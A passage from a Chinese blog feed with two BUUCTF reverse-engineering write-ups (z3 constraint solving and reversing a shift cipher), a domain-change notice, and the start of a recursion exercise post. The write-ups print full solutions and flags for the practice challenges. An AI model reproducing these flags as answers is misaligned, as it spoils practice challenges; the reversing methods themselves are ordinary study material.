      <link href="/2021/03/c9294232.html"/>
      <url>/2021/03/c9294232.html</url>
      
        <content type="html"><![CDATA[<h2 id="初识"><a href="#初识" class="headerlink" title="初识"></a>初识</h2><p>拿到题目后先拉入PEiD检测，是64位程序，并且有一个upx壳，用upxshell脱壳后拖入IDA打开进行代码分析</p><h2 id="熟悉"><a href="#熟悉" class="headerlink" title="熟悉"></a>熟悉</h2><p>脱壳后看函数列表有start函数，打开反编译后发现没有什么内容，应该是假入口，于是更换思路，直接去查看字符串</p><p><img src="https://i.loli.net/2021/03/26/PQl7sx9wjeLngcv.png" alt="img"></p><p>找到了关于flag判定的提示，转到correct字符串，然后回溯使用了它的函数（其他字符串也可以）</p><p><img src="https://i.loli.net/2021/03/26/uwPjkQJWdrvXZRt.png" alt="img"></p><p>很明显这个<code>sub_4009AE</code>所进行的判断就是我们要求的结果，直接回溯上去:</p><p><img src="https://i.loli.net/2021/03/26/DdjGhZr8XCObc6B.png" alt="img"></p><p>到这一步就很明显了…z3解方程，直接上python，要注意这里少了一个<code>a[6]</code></p><h2 id="整活"><a href="#整活" class="headerlink" title="整活"></a>整活</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br>s = Solver()<br>a1 = [<span class="hljs-number">0</span>]*<span class="hljs-number">32</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    a1[i] = Int(<span class="hljs-string">&#x27;a1[&#x27;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;]&#x27;</span>)<br><br>s.add( <span class="hljs-number">1629056</span> * a1[<span class="hljs-number">0</span>] == <span class="hljs-number">166163712</span> )<br>s.add( <span class="hljs-number">6771600</span> * a1[<span class="hljs-number">1</span>] == <span class="hljs-number">731332800</span> )<br>s.add( <span class="hljs-number">3682944</span> * a1[<span class="hljs-number">2</span>] == <span class="hljs-number">357245568</span> )<br>s.add( <span class="hljs-number">10431000</span> * a1[<span class="hljs-number">3</span>] == <span class="hljs-number">1074393000</span> )<br>s.add( <span class="hljs-number">3977328</span> * a1[<span class="hljs-number">4</span>] == <span class="hljs-number">489211344</span> )<br>s.add( <span class="hljs-number">5138336</span> * a1[<span class="hljs-number">5</span>] == <span class="hljs-number">518971936</span> )<br>s.add( <span class="hljs-number">7532250</span> * a1[<span class="hljs-number">7</span>] == <span class="hljs-number">406741500</span> )<br>s.add( <span class="hljs-number">5551632</span> * a1[<span class="hljs-number">8</span>] == <span class="hljs-number">294236496</span> )<br>s.add( <span class="hljs-number">3409728</span> * a1[<span class="hljs-number">9</span>] == <span class="hljs-number">177305856</span> )<br>s.add( <span class="hljs-number">13013670</span> * a1[<span class="hljs-number">10</span>] == <span class="hljs-number">650683500</span> )<br>s.add( <span class="hljs-number">6088797</span> * a1[<span class="hljs-number">11</span>] == <span class="hljs-number">298351053</span> )<br>s.add( <span class="hljs-number">7884663</span> * a1[<span class="hljs-number">12</span>] == <span class="hljs-number">386348487</span> )<br>s.add( <span class="hljs-number">8944053</span> * a1[<span class="hljs-number">13</span>] == <span class="hljs-number">438258597</span> )<br>s.add( <span class="hljs-number">5198490</span> * a1[<span class="hljs-number">14</span>] == <span class="hljs-number">249527520</span> )<br>s.add( <span class="hljs-number">4544518</span> * a1[<span class="hljs-number">15</span>] == <span class="hljs-number">445362764</span> )<br>s.add( <span class="hljs-number">3645600</span> * a1[<span class="hljs-number">17</span>] == <span class="hljs-number">174988800</span> )<br>s.add( <span class="hljs-number">10115280</span> * a1[<span class="hljs-number">16</span>] == <span class="hljs-number">981182160</span> )<br>s.add( <span class="hljs-number">9667504</span> * a1[<span class="hljs-number">18</span>] == <span class="hljs-number">493042704</span> )<br>s.add( <span class="hljs-number">5364450</span> * a1[<span class="hljs-number">19</span>] == <span class="hljs-number">257493600</span> )<br>s.add( <span class="hljs-number">13464540</span> * a1[<span class="hljs-number">20</span>] == <span class="hljs-number">767478780</span> )<br>s.add( <span class="hljs-number">5488432</span> * a1[<span class="hljs-number">21</span>] == <span class="hljs-number">312840624</span> )<br>s.add( <span class="hljs-number">14479500</span> * a1[<span class="hljs-number">22</span>] == <span class="hljs-number">1404511500</span> )<br>s.add( <span class="hljs-number">6451830</span> * a1[<span class="hljs-number">23</span>] == <span class="hljs-number">316139670</span> )<br>s.add( <span class="hljs-number">6252576</span> * a1[<span class="hljs-number">24</span>] == <span class="hljs-number">619005024</span> )<br>s.add( <span class="hljs-number">7763364</span> * a1[<span class="hljs-number">25</span>] == <span class="hljs-number">372641472</span> )<br>s.add( <span class="hljs-number">7327320</span> * a1[<span class="hljs-number">26</span>] == <span class="hljs-number">373693320</span> )<br>s.add( <span class="hljs-number">8741520</span> * a1[<span class="hljs-number">27</span>] == <span class="hljs-number">498266640</span> )<br>s.add( <span class="hljs-number">8871876</span> * a1[<span class="hljs-number">28</span>] == <span class="hljs-number">452465676</span> )<br>s.add( <span class="hljs-number">4086720</span> * a1[<span class="hljs-number">29</span>] == <span class="hljs-number">208422720</span> )<br>s.add( <span class="hljs-number">9374400</span> * a1[<span class="hljs-number">30</span>] == <span class="hljs-number">515592000</span> )<br>s.add(<span class="hljs-number">5759124</span> * a1[<span class="hljs-number">31</span>] == <span class="hljs-number">719890500</span>)<br>s.check()<br><span class="hljs-built_in">print</span>(s.model())<br></code></pre></td></tr></table></figure><p>解出结果如下</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs inform7"><span class="hljs-comment">[a1<span class="hljs-comment">[31]</span> = 125,</span><br><span class="hljs-comment"> a1<span class="hljs-comment">[30]</span> = 55,</span><br><span class="hljs-comment"> a1<span class="hljs-comment">[29]</span> = 51,</span><br><span class="hljs-comment"> a1<span class="hljs-comment">[28]</span> = 51,</span><br><span class="hljs-comment"> a1<span class="hljs-comment">[27]</span> = 57,</span><br><span class="hljs-comment"> a1<span class="hljs-comment">[26]</span> = 51,</span><br><span class="hljs-comment"> a1<span class="hljs-comment">[25]</span> = 48,</span><br><span class="hljs-comment"> a1<span class="hljs-comment">[24]</span> = 99,</span><br><span class="hljs-comment"> a1<span class="hljs-comment">[23]</span> = 49,</span><br><span class="hljs-comment"> a1<span class="hljs-comment">[22]</span> = 97,</span><br><span class="hljs-comment"> a1<span class="hljs-comment">[21]</span> = 57,</span><br><span class="hljs-comment"> a1<span class="hljs-comment">[20]</span> = 57,</span><br><span class="hljs-comment"> a1<span class="hljs-comment">[19]</span> = 48,</span><br><span class="hljs-comment"> a1<span class="hljs-comment">[18]</span> = 51,</span><br><span class="hljs-comment"> a1<span class="hljs-comment">[16]</span> = 97,</span><br><span class="hljs-comment"> a1<span class="hljs-comment">[17]</span> = 48,</span><br><span class="hljs-comment"> a1<span class="hljs-comment">[15]</span> = 98,</span><br><span class="hljs-comment"> a1<span class="hljs-comment">[14]</span> = 48,</span><br><span class="hljs-comment"> a1<span class="hljs-comment">[13]</span> = 49,</span><br><span class="hljs-comment"> a1<span class="hljs-comment">[12]</span> = 49,</span><br><span class="hljs-comment"> a1<span class="hljs-comment">[11]</span> = 49,</span><br><span class="hljs-comment"> a1<span class="hljs-comment">[10]</span> = 50,</span><br><span class="hljs-comment"> a1<span class="hljs-comment">[9]</span> = 52,</span><br><span class="hljs-comment"> a1<span class="hljs-comment">[8]</span> = 53,</span><br><span class="hljs-comment"> a1<span class="hljs-comment">[7]</span> = 54,</span><br><span class="hljs-comment"> a1<span class="hljs-comment">[5]</span> = 101,</span><br><span class="hljs-comment"> a1<span class="hljs-comment">[4]</span> = 123,</span><br><span class="hljs-comment"> a1<span class="hljs-comment">[3]</span> = 103,</span><br><span class="hljs-comment"> a1<span class="hljs-comment">[2]</span> = 97,</span><br><span class="hljs-comment"> a1<span class="hljs-comment">[1]</span> = 108,</span><br><span class="hljs-comment"> a1<span class="hljs-comment">[0]</span> = 102]</span><br></code></pre></td></tr></table></figure><p>接着拿着这些结果继续求出他们所对应的字符输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python">a1 = [<span class="hljs-number">0</span>]*<span class="hljs-number">32</span><br>a1[<span class="hljs-number">31</span>] = <span class="hljs-number">125</span><br>a1[<span class="hljs-number">30</span>] = <span class="hljs-number">55</span><br>a1[<span class="hljs-number">29</span>] = <span class="hljs-number">51</span><br>a1[<span class="hljs-number">28</span>] = <span class="hljs-number">51</span><br>a1[<span class="hljs-number">27</span>] = <span class="hljs-number">57</span><br>a1[<span class="hljs-number">26</span>] = <span class="hljs-number">51</span><br>a1[<span class="hljs-number">25</span>] = <span class="hljs-number">48</span><br>a1[<span class="hljs-number">24</span>] = <span class="hljs-number">99</span><br>a1[<span class="hljs-number">23</span>] = <span class="hljs-number">49</span><br>a1[<span class="hljs-number">22</span>] = <span class="hljs-number">97</span><br>a1[<span class="hljs-number">21</span>] = <span class="hljs-number">57</span><br>a1[<span class="hljs-number">20</span>] = <span class="hljs-number">57</span><br>a1[<span class="hljs-number">19</span>] = <span class="hljs-number">48</span><br>a1[<span class="hljs-number">18</span>] = <span class="hljs-number">51</span><br>a1[<span class="hljs-number">16</span>] = <span class="hljs-number">97</span><br>a1[<span class="hljs-number">17</span>] = <span class="hljs-number">48</span><br>a1[<span class="hljs-number">15</span>] = <span class="hljs-number">98</span><br>a1[<span class="hljs-number">14</span>] = <span class="hljs-number">48</span><br>a1[<span class="hljs-number">13</span>] = <span class="hljs-number">49</span><br>a1[<span class="hljs-number">12</span>] = <span class="hljs-number">49</span><br>a1[<span class="hljs-number">11</span>] = <span class="hljs-number">49</span><br>a1[<span class="hljs-number">10</span>] = <span class="hljs-number">50</span><br>a1[<span class="hljs-number">9</span>] = <span class="hljs-number">52</span><br>a1[<span class="hljs-number">8</span>] = <span class="hljs-number">53</span><br>a1[<span class="hljs-number">7</span>] = <span class="hljs-number">54</span><br>a1[<span class="hljs-number">5</span>] = <span class="hljs-number">101</span><br>a1[<span class="hljs-number">4</span>] = <span class="hljs-number">123</span><br>a1[<span class="hljs-number">3</span>] = <span class="hljs-number">103</span><br>a1[<span class="hljs-number">2</span>] = <span class="hljs-number">97</span><br>a1[<span class="hljs-number">1</span>] = <span class="hljs-number">108</span><br>a1[<span class="hljs-number">0</span>] = <span class="hljs-number">102</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    <span class="hljs-keyword">if</span> i == <span class="hljs-number">6</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(a1[i]), end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>得出最终结果</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">flag&#123;e1<br><span class="hljs-number">65421110</span>ba03099a<span class="hljs-number">1c039337</span>&#125;<br></code></pre></td></tr></table></figure><p>其中加了1的那一位具体数字是多少目前不清楚，题目里面也没有明确的提示，因此只能爆破，依次尝试，但是很幸运，上手一个1就直接通过了，因此本题得解<code>flag&#123;e165421110ba03099a1c039337&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu-re-rome</title>
      <link href="/2021/03/deb1f1bd.html"/>
      <url>/2021/03/deb1f1bd.html</url>
      
        <content type="html"><![CDATA[<h2 id="初识程序"><a href="#初识程序" class="headerlink" title="初识程序"></a>初识程序</h2><p>拿到程序后，先放入PEID进行检测</p><p><img src="https://i.loli.net/2021/03/19/eSiRoECsqx5lL7Z.png" alt="img"></p><p>程序无壳，是32位的，可以直接放入IDA32进行反编译</p><h2 id="开始整活"><a href="#开始整活" class="headerlink" title="开始整活"></a>开始整活</h2><p>进入后找到main函数入口，解析为C语言</p><p><img src="https://i.loli.net/2021/03/19/Rh6WDT8C9ZFbgxE.png" alt="img"></p><p>有两个函数，一个是_main()函数，一个是func()函数，进入__main发现只有一个if判定没有</p><p>没有什么实质性的东西，然后转只能回头找func,进入后确认是主要判定的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">func</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+14h] [ebp-44h]</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+18h] [ebp-40h]</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+1Ch] [ebp-3Ch]</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [esp+20h] [ebp-38h]</span><br>  <span class="hljs-type">unsigned</span> __int8 v5; <span class="hljs-comment">// [esp+24h] [ebp-34h]</span><br>  <span class="hljs-type">unsigned</span> __int8 v6; <span class="hljs-comment">// [esp+25h] [ebp-33h]</span><br>  <span class="hljs-type">unsigned</span> __int8 v7; <span class="hljs-comment">// [esp+26h] [ebp-32h]</span><br>  <span class="hljs-type">unsigned</span> __int8 v8; <span class="hljs-comment">// [esp+27h] [ebp-31h]</span><br>  <span class="hljs-type">unsigned</span> __int8 v9; <span class="hljs-comment">// [esp+28h] [ebp-30h]</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// [esp+29h] [ebp-2Fh]</span><br>  <span class="hljs-type">int</span> v11; <span class="hljs-comment">// [esp+2Dh] [ebp-2Bh]</span><br>  <span class="hljs-type">int</span> v12; <span class="hljs-comment">// [esp+31h] [ebp-27h]</span><br>  <span class="hljs-type">int</span> v13; <span class="hljs-comment">// [esp+35h] [ebp-23h]</span><br>  <span class="hljs-type">unsigned</span> __int8 v14; <span class="hljs-comment">// [esp+39h] [ebp-1Fh]</span><br>  <span class="hljs-type">char</span> v15; <span class="hljs-comment">// [esp+3Bh] [ebp-1Dh]</span><br>  <span class="hljs-type">char</span> v16; <span class="hljs-comment">// [esp+3Ch] [ebp-1Ch]</span><br>  <span class="hljs-type">char</span> v17; <span class="hljs-comment">// [esp+3Dh] [ebp-1Bh]</span><br>  <span class="hljs-type">char</span> v18; <span class="hljs-comment">// [esp+3Eh] [ebp-1Ah]</span><br>  <span class="hljs-type">char</span> v19; <span class="hljs-comment">// [esp+3Fh] [ebp-19h]</span><br>  <span class="hljs-type">char</span> v20; <span class="hljs-comment">// [esp+40h] [ebp-18h]</span><br>  <span class="hljs-type">char</span> v21; <span class="hljs-comment">// [esp+41h] [ebp-17h]</span><br>  <span class="hljs-type">char</span> v22; <span class="hljs-comment">// [esp+42h] [ebp-16h]</span><br>  <span class="hljs-type">char</span> v23; <span class="hljs-comment">// [esp+43h] [ebp-15h]</span><br>  <span class="hljs-type">char</span> v24; <span class="hljs-comment">// [esp+44h] [ebp-14h]</span><br>  <span class="hljs-type">char</span> v25; <span class="hljs-comment">// [esp+45h] [ebp-13h]</span><br>  <span class="hljs-type">char</span> v26; <span class="hljs-comment">// [esp+46h] [ebp-12h]</span><br>  <span class="hljs-type">char</span> v27; <span class="hljs-comment">// [esp+47h] [ebp-11h]</span><br>  <span class="hljs-type">char</span> v28; <span class="hljs-comment">// [esp+48h] [ebp-10h]</span><br>  <span class="hljs-type">char</span> v29; <span class="hljs-comment">// [esp+49h] [ebp-Fh]</span><br>  <span class="hljs-type">char</span> v30; <span class="hljs-comment">// [esp+4Ah] [ebp-Eh]</span><br>  <span class="hljs-type">char</span> v31; <span class="hljs-comment">// [esp+4Bh] [ebp-Dh]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+4Ch] [ebp-Ch]</span><br><br>  v15 = <span class="hljs-string">&#x27;Q&#x27;</span>;<br>  v16 = <span class="hljs-string">&#x27;s&#x27;</span>;<br>  v17 = <span class="hljs-string">&#x27;w&#x27;</span>;<br>  v18 = <span class="hljs-string">&#x27;3&#x27;</span>;<br>  v19 = <span class="hljs-string">&#x27;s&#x27;</span>;<br>  v20 = <span class="hljs-string">&#x27;j&#x27;</span>;<br>  v21 = <span class="hljs-string">&#x27;_&#x27;</span>;<br>  v22 = <span class="hljs-string">&#x27;l&#x27;</span>;<br>  v23 = <span class="hljs-string">&#x27;z&#x27;</span>;<br>  v24 = <span class="hljs-string">&#x27;4&#x27;</span>;<br>  v25 = <span class="hljs-string">&#x27;_&#x27;</span>;<br>  v26 = <span class="hljs-string">&#x27;U&#x27;</span>;<br>  v27 = <span class="hljs-string">&#x27;j&#x27;</span>;<br>  v28 = <span class="hljs-string">&#x27;w&#x27;</span>;<br>  v29 = <span class="hljs-string">&#x27;@&#x27;</span>;<br>  v30 = <span class="hljs-string">&#x27;l&#x27;</span>;<br>  v31 = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please input:&quot;</span>);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, &amp;v5);<br>  result = v5;<br>  <span class="hljs-keyword">if</span> ( v5 == <span class="hljs-string">&#x27;A&#x27;</span> )<br>  &#123;<br>    result = v6;<br>    <span class="hljs-keyword">if</span> ( v6 == <span class="hljs-string">&#x27;C&#x27;</span> )<br>    &#123;<br>      result = v7;<br>      <span class="hljs-keyword">if</span> ( v7 == <span class="hljs-string">&#x27;T&#x27;</span> )<br>      &#123;<br>        result = v8;<br>        <span class="hljs-keyword">if</span> ( v8 == <span class="hljs-string">&#x27;F&#x27;</span> )<br>        &#123;<br>          result = v9;<br>          <span class="hljs-keyword">if</span> ( v9 == <span class="hljs-string">&#x27;&#123;&#x27;</span> )<br>          &#123;<br>            result = v14;<br>            <span class="hljs-keyword">if</span> ( v14 == <span class="hljs-string">&#x27;&#125;&#x27;</span> )<br>            &#123;<br>              v1 = v10;<br>              v2 = v11;<br>              v3 = v12;<br>              v4 = v13;<br>              <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">15</span>; ++i )<br>              &#123;<br>                <span class="hljs-keyword">if</span> ( *((_BYTE *)&amp;v1 + i) &gt; <span class="hljs-number">64</span> &amp;&amp; *((_BYTE *)&amp;v1 + i) &lt;= <span class="hljs-number">90</span> )<br>                  *((_BYTE *)&amp;v1 + i) = (*((<span class="hljs-type">char</span> *)&amp;v1 + i) - <span class="hljs-number">51</span>) % <span class="hljs-number">26</span> + <span class="hljs-number">65</span>;<br>                <span class="hljs-keyword">if</span> ( *((_BYTE *)&amp;v1 + i) &gt; <span class="hljs-number">96</span> &amp;&amp; *((_BYTE *)&amp;v1 + i) &lt;= <span class="hljs-number">122</span> )<br>                  *((_BYTE *)&amp;v1 + i) = (*((<span class="hljs-type">char</span> *)&amp;v1 + i) - <span class="hljs-number">79</span>) % <span class="hljs-number">26</span> + <span class="hljs-number">97</span>;<br>              &#125;<br>              <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">15</span>; ++i )<br>              &#123;<br>                result = (<span class="hljs-type">unsigned</span> __int8)*(&amp;v15 + i);<br>                <span class="hljs-keyword">if</span> ( *((_BYTE *)&amp;v1 + i) != (_BYTE)result )<br>                  <span class="hljs-keyword">return</span> result;<br>              &#125;<br>              result = <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You are correct!&quot;</span>);<br>            &#125;<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>对有关的字符进行转换后发现逻辑比较简单，就是对字符串进行一个分支结构的判断，根据前面嵌套的if语句判断开头是ACTF{，结尾有一个}(废话),处理以后再和前面的一个字符串连接起来，即可得到解</p><h2 id="加大力度"><a href="#加大力度" class="headerlink" title="加大力度"></a>加大力度</h2><p>分析到这里问题就很简单了，直接开始脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">&quot;ACTF&#123;&quot;</span><br>v15=<span class="hljs-string">&quot;Qsw3sj_lz4_Ujw@l&quot;</span><br>s=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(v15)):<br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">128</span>):<br>        i=s<br>        <span class="hljs-keyword">if</span> i&gt;<span class="hljs-number">64</span> <span class="hljs-keyword">and</span> i &lt;=<span class="hljs-number">90</span>:<br>            i=(i-<span class="hljs-number">51</span>)%<span class="hljs-number">26</span>+<span class="hljs-number">65</span><br>        <span class="hljs-keyword">if</span> i&gt;<span class="hljs-number">96</span> <span class="hljs-keyword">and</span> i&lt;=<span class="hljs-number">122</span>:<br>            i=(i-<span class="hljs-number">79</span>)%<span class="hljs-number">26</span>+<span class="hljs-number">97</span><br>        <span class="hljs-keyword">if</span> i==<span class="hljs-built_in">ord</span>(v15[k]):<br>            a=a+<span class="hljs-built_in">chr</span>(s)<br><span class="hljs-built_in">print</span>(a+<span class="hljs-string">&quot;&#125;&quot;</span>)<br></code></pre></td></tr></table></figure><p>最后找到了flag<code>ACTF&#123;Cae3ar_th4_Gre@t&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于网站域名变更的通告</title>
      <link href="/2021/03/564fbbbd.html"/>
      <url>/2021/03/564fbbbd.html</url>
      
        <content type="html"><![CDATA[<p>各位朋友：</p><p>​感谢各位一直以来的<del>关注</del>，经过一番努力，我成功申请到了国内备案号，获得了在境内开站的授权，因此，从今天起我的博客域名将从 <a href="http://www.0error.xyz/">www.0error.xyz</a> 迁移至 <a href="http://www.0error.net/">www.0error.net</a> ,在公告期间，域名正常解析，但是原域名将被解析到境外线路，访问较慢，通过新域名即可快速访问我的博客，特在此发一公告以表纪念，今后和朋友们一起继续努力学习，逐步成为~~~蒟蒻~~~大佬！</p><p>​2021年3月18日</p>]]></content>
      
      
      
        <tags>
            
            <tag> 站内公告 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蓝桥杯复习-递归部分</title>
      <link href="/2021/03/84f9ae2e.html"/>
      <url>/2021/03/84f9ae2e.html</url>
      
        <content type="html"><![CDATA[<h2 id="Acw-92-递归实现指数型枚举"><a href="#Acw-92-递归实现指数型枚举" class="headerlink" title="Acw 92.递归实现指数型枚举"></a>Acw 92.递归实现指数型枚举</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>从 1∼n1∼n 这 nn 个整数中随机选取任意多个，输出所有可能的选择方案。</p><h4 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h4><p>输入一个整数 nn。</p><h4 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h4><p>每行输出一种方案。</p><p>同一行内的数必须升序排列，相邻两个数用恰好 11 个空格隔开。</p><p>对于没有选任何数的方案，输出空行。</p><p>本题有自定义校验器（SPJ），各行（不同方案）之间的顺序任意。</p><h4 id="数据范围"><a href="#数据范围" class="headerlink" title="数据范围"></a>数据范围</h4><p>1≤n≤151≤n≤15</p><h4 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">3<br></code></pre></td></tr></table></figure><h4 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h4><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">3</span><br><span class="hljs-number">2</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">3</span><br><span class="hljs-number">1</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">3</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">2</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">2</span> <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 